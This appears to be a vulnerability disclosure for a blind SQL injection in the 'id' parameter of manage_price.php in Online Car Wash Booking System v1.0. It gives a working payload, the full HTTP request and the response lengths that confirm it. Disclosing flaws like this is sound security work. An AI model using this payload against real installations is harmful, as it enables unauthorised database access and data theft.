# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/admin/services/manage_price.php?id=

Vulnerability location: /ocwbs/admin/services/manage_price.php?id=, id

Current database name: ocwbs_db,length is 8

[+] Payload: /ocwbs/admin/services/manage_price.php?id=2%27%20and%20length(database())%20=8--+ // Leak place ---> id

```sql
GET /ocwbs/admin/services/manage_price.php?id=2%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close
```

When length (database ()) = 7, Content-Length: 4256

![image](https://user-images.githubusercontent.com/54017627/169305433-da772f1c-b21d-44d8-b8ad-ac29ab921ce0.png)

![image](https://user-images.githubusercontent.com/54017627/169305774-5144cadd-24a5-4dac-b945-1ad2b7a74360.png)

When length (database ()) = 8, Content-Length: 4279

![image](https://user-images.githubusercontent.com/54017627/169305809-681d4acd-aacb-4ed5-a0a2-4b09562cc01b.png)

![image](https://user-images.githubusercontent.com/54017627/169305479-86ab276a-9909-47f2-8c5d-829eac5bdcbb.png)
